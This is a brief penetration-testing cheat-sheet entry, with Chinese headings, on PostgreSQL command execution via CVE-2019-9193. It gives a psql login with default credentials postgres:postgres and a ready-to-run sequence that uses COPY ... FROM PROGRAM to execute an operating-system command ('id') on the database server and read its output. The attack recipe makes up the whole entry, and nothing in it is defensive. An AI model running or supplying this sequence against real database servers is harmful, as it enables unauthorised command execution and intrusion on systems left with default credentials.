# ✔️ SQL注入 - SQL Injection

## PostgreSQL

### CVE-2019-9193 命令执行

```bash
# 登录了postgres之后 (默认凭证postgres:postgres)
psql -h 192.168.xxx.xxx -p 5437 -U postgres
\c postgres
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```



##



